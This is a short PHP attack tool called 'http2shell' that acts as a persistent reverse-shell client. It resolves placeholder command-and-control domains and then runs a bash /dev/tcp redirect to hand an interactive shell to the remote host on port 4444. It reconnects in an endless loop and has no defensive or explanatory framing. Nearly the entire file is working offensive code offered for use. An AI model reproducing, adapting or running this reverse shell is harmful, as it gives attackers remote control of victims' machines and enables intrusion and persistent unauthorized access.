#!/usr/bin/php
<?php

$C2HttpsDomain   = "yourc2httpsdomain.com";
$C2HttpDomain    = "yourc2httpdomain.com";
$C2DefaultDomain = "127.0.0.1";
$Port            = 4444;

$Reset     = "\033[0m";
$Red       = "\033[31m";
$DarkGreen = "\033[38;5;22m";
$Orange    = "\033[38;5;208m";
$White     = "\033[37m";
$Bold      = "\033[1m";
$Dim       = "\033[2m";
$Italic    = "\033[3m";

$Banner = "
$Bold
{$Orange}    __    __  __       {$Red} ___{$Orange}        __         ____
{$Orange}   / /_  / /_/ /_____ {$Red} |__ \\{$Orange} _____/ /_  ___  / / /
{$Orange}  / __ \\/ __/ __/ __ \\{$Red} __/ /{$Orange}/ ___/ __ \\/ _ \\/ / /
{$Orange} / / / / /_/ /_/ /_/ /{$Red}/___/{$Orange}(__  ) / / /  __/ / /
{$Orange}/_/ /_/\\__/\\__/ .___/{$Red}/____/{$Orange}____/_/ /_/\\___/_/_/
{$Orange}             /_/
{$Bold}{$Red}  + {$Dim}{$White}{$Italic}http2shell{$Reset}
{$Bold}{$Red}  + {$Dim}{$White}{$Italic}author: tom7{$Reset}
{$Bold}{$Red}  + {$Dim}{$White}{$Italic}github: https://github.com/tom7voldemort{$Reset}
{$Bold}{$Red}  + {$Dim}{$White}{$Italic}version: 1.2{$Reset}
$Reset
";

function TypeWrite($Msg, $Delay = 10000) {
    for ($I = 0; $I < strlen($Msg); $I++) {
        echo $Msg[$I];
        usleep($Delay);
    }
    echo "\n";
}

function Info($Msg) {
    global $Bold, $Dim, $White, $DarkGreen, $Reset;
    TypeWrite("{$Bold}{$Dim}{$White}[{$DarkGreen}info +{$White}] {$Msg}{$Reset}");
}

function Warnings($Msg) {
    global $Bold, $Dim, $White, $Orange, $Reset;
    TypeWrite("{$Bold}{$Dim}{$White}[{$Orange}warn !{$White}] {$Msg}{$Reset}");
}

function Errors($Msg) {
    global $Bold, $Dim, $White, $Red, $Reset;
    TypeWrite("{$Bold}{$Dim}{$White}[{$Red}error x{$White}] {$Msg}{$Reset}");
}

function Resolve() {
    global $C2HttpsDomain, $C2HttpDomain, $C2DefaultDomain;
    foreach ([$C2HttpsDomain, $C2HttpDomain, $C2DefaultDomain] as $Domain) {
        $Ip = gethostbyname($Domain);
        if ($Ip !== $Domain) {
            Info("resolved $Domain -> $Ip");
            return $Ip;
        }
    }
    return null;
}

function Spawn($Ip, $Port) {
    Info("spawning shell to $Ip:$Port");
    $Ret = system("bash -c 'bash -i >& /dev/tcp/$Ip/$Port 0>&1'");
    return $Ret !== false;
}

function Exploit() {
    global $Port;
    while (true) {
        try {
            $Ip = Resolve();
            if (!$Ip) {
                Errors("no server active. retrying...");
                sleep(3);
                continue;
            }
            Info("target server: $Ip:$Port");
            Info("starting shell session...");
            $Ok = Spawn($Ip, $Port);
            if ($Ok) {
                Info("shell session ended. reconnecting...");
            } else {
                Warnings("bad connection. retrying...");
            }
            usleep(500000);
        } catch (Exception $E) {
            usleep(500000);
        }
    }
}

system("clear");
echo $Banner;
Exploit();
